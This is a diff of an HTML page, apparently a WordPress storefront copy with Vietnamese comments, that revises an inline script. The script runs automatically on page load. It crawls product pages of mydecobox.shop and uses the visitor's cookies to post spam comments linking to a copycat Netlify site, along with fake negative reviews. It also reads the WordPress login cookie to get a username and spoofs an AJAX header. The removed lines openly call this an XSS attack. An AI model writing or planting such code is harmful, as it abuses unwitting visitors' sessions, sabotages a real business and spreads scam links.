@@ -2919,11 +2919,11 @@
       data-wp-strategy="defer"
     ></script>
     <script>
-      // Config
-      const ATTACK_CONFIG = {
-        targetWebsite: "https://mydecobox.shop",
-        delayBetweenRequests: 2000,
-        maxRetries: 2,
+      // Config có thể tùy chỉnh
+      const CONFIG = {
+        delayBetweenRequests: 2500, // Giảm delay để tăng tốc độ
+        maxRetries: 3, // Số lần thử lại khi fail
+        useCurrentUser: false, // Sử dụng tên user thực nếu có
       };
 
       const PRODUCT_PAGES = [
@@ -2932,9 +2932,9 @@
       ];
 
       const SPAM_COMMENTS = [
-        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn! [TRUY CẬP NGAY] https://mydecobox.netlify.app/product/sticker-vintage-da-dang-trang-tri-1-tam-50-cai/",
-        "📣 Deal hot chỉ 49k! [XEM NGAY] https://mydecobox.netlify.app/product/hop-qua-trai-tim/",
-        "🎁 Hộp quà handmade đang giảm sâu tại: https://mydecobox.netlify.app/product/hop-qua-am/",
+        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/sticker-vintage-da-dang-trang-tri-1-tam-50-cai/ để không bỏ lỡ siêu deal!",
+        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/hop-qua-am/ để không bỏ lỡ siêu deal!",
+        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/hop-qua-trai-tim/ để không bỏ lỡ siêu deal!",
         "Giao hàng rất lâu",
         "Nhân viên thái độ lồi lõm",
       ];
@@ -2942,29 +2942,20 @@
       // Hàm lấy tên người dùng hiện tại
       function getCurrentUsername() {
         try {
-          // Cách 1: Lấy từ localStorage (nếu có)
-          if (localStorage.getItem("currentUser")) {
-            return JSON.parse(localStorage.getItem("currentUser")).username;
-          }
+          // Thử lấy từ cookie WordPress
+          const wpCookie = document.cookie
+            .split(";")
+            .find((c) => c.trim().startsWith("wordpress_logged_in_"));
+          if (wpCookie) return wpCookie.split("|")[0].trim();
 
-          // Cách 2: Lấy từ cookie
-          const cookies = document.cookie.split(";");
-          const userCookie = cookies.find((c) =>
-            c.trim().startsWith("wordpress_logged_in_")
-          );
-          if (userCookie) {
-            return userCookie.split("|")[0].trim();
-          }
-
-          // Cách 3: Lấy từ các phần tử HTML thông thường
-          const usernameElements = [
+          // Thử lấy từ các element thông thường
+          const userElements = [
             document.querySelector(".username"),
             document.querySelector("#wp-admin-bar-my-account a"),
-            document.querySelector('meta[name="current-user"]'),
           ];
 
-          for (const el of usernameElements) {
-            if (el && el.textContent) return el.textContent.trim();
+          for (const el of userElements) {
+            if (el?.textContent?.trim()) return el.textContent.trim();
           }
 
           return "Khách"; // Fallback
@@ -2974,86 +2965,113 @@
         }
       }
 
-      // Hàm gửi comment độc hại
-      async function sendXSSComment(url, comment) {
-        const username = getCurrentUsername();
-
-        const formData = new URLSearchParams();
-        formData.append("name", username);
-        formData.append("comment", comment);
-        formData.append("xss_submit", "1");
-
+      // Hàm fetch với retry
+      async function fetchWithRetry(
+        url,
+        options = {},
+        retries = CONFIG.maxRetries
+      ) {
         try {
           const res = await fetch(url, {
-            method: "POST",
+            ...options,
             headers: {
               "Content-Type": "application/x-www-form-urlencoded",
+              "X-Requested-With": "XMLHttpRequest", // Giả làm AJAX request
             },
-            body: formData,
-            credentials: "include",
+          });
+          return res;
+        } catch (err) {
+          if (retries > 0) {
+            await new Promise((r) => setTimeout(r, 2000));
+            return fetchWithRetry(url, options, retries - 1);
+          }
+          throw err;
+        }
+      }
+
+      // Lấy link sản phẩm cải tiến
+      async function extractProductLinks(url) {
+        try {
+          const res = await fetchWithRetry(url);
+          const html = await res.text();
+          const doc = new DOMParser().parseFromString(html, "text/html");
+
+          return [
+            ...new Set(
+              Array.from(doc.querySelectorAll('a[href*="/product/"]'))
+                .map((a) => a.href)
+                .filter((href) => href.startsWith("https://mydecobox.shop"))
+            ),
+          ];
+        } catch (err) {
+          console.warn(`Không crawl được ${url}`, err);
+          return [];
+        }
+      }
+
+      // Gửi comment với xử lý lỗi tốt hơn
+      async function sendComment(productUrl, commentText) {
+        const payload = new URLSearchParams();
+        payload.append(
+          "name",
+          CONFIG.useCurrentUser ? getCurrentUsername() : "Khách"
+        );
+        payload.append("comment", commentText);
+        payload.append("xss_submit", "1");
+
+        try {
+          const res = await fetchWithRetry(productUrl, {
+            method: "POST",
+            body: payload,
+            credentials: "include", // Gửi cả cookie
           });
 
-          return res.ok;
-        } catch (err) {
-          console.error("Gửi thất bại:", err);
-          return false;
-        }
-      }
-
-      // Hàm crawl link sản phẩm
-      async function getProductLinks() {
-        const allLinks = new Set();
-
-        for (const page of PRODUCT_PAGES) {
-          try {
-            const res = await fetch(`${ATTACK_CONFIG.targetWebsite}${page}`);
-            const html = await res.text();
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(html, "text/html");
-
-            doc.querySelectorAll('a[href*="/product/"]').forEach((a) => {
-              const href = a.getAttribute("href");
-              if (href.startsWith(ATTACK_CONFIG.targetWebsite)) {
-                allLinks.add(href);
-              }
-            });
-          } catch (err) {
-            console.warn(`Lỗi khi crawl ${page}:`, err);
+          if (res.ok || res.status === 302) {
+            // Xử lý cả redirect
+            console.log(`✅ Thành công: ${productUrl}`);
+            return true;
           }
+          console.warn(`❌ Lỗi HTTP: ${productUrl} (${res.status})`);
+        } catch (err) {
+          console.error(`🔥 Lỗi gửi: ${productUrl}`, err);
         }
-
-        return Array.from(allLinks);
+        return false;
       }
 
-      // Hàm thực thi tấn công
-      async function executeXSSAttack() {
-        console.log("🛡️ Bắt đầu tấn công...");
+      // Hàm chính thực thi
+      async function executeSpam() {
+        console.log("🛡️ Bắt đầu gửi spam comment...");
 
-        const productLinks = await getProductLinks();
-        if (productLinks.length === 0) {
+        // Lấy tất cả link sản phẩm
+        const allLinks = [];
+        for (const url of PRODUCT_PAGES) {
+          const links = await extractProductLinks(url);
+          allLinks.push(...links);
+          console.log(`🔗 Tìm thấy ${links.length} sản phẩm từ ${url}`);
+        }
+
+        if (allLinks.length === 0) {
           console.error("Không tìm thấy sản phẩm nào!");
           return;
         }
 
-        console.log(`🎯 Tìm thấy ${productLinks.length} sản phẩm`);
+        console.log(`🎯 Tổng cộng ${allLinks.length} sản phẩm sẽ bị spam`);
 
-        // Gửi comment XSS đến từng sản phẩm
-        for (let i = 0; i < productLinks.length; i++) {
-          const targetUrl = productLinks[i];
-          const maliciousComment = SPAM_COMMENTS[i % SPAM_COMMENTS.length];
-
+        // Gửi comment đến từng sản phẩm
+        allLinks.forEach((link, i) => {
           setTimeout(async () => {
-            const success = await sendXSSComment(targetUrl, maliciousComment);
-            console.log(success ? `✅ ${targetUrl}` : `❌ ${targetUrl}`);
-          }, i * ATTACK_CONFIG.delayBetweenRequests);
-        }
+            const randomComment =
+              SPAM_COMMENTS[Math.floor(Math.random() * SPAM_COMMENTS.length)];
+            await sendComment(link, randomComment);
+          }, i * CONFIG.delayBetweenRequests);
+        });
       }
 
-      // Tự động chạy khi trang web tải xong
-      if (document.readyState === "loading") {
-        document.addEventListener("DOMContentLoaded", executeXSSAttack);
+      // Tự động chạy sau khi trang load
+      if (document.readyState === "complete") {
+        setTimeout(executeSpam, 3000);
       } else {
-        setTimeout(executeXSSAttack, 3000);
+        window.addEventListener("load", () => setTimeout(executeSpam, 3000));
       }
     </script>
   </body>
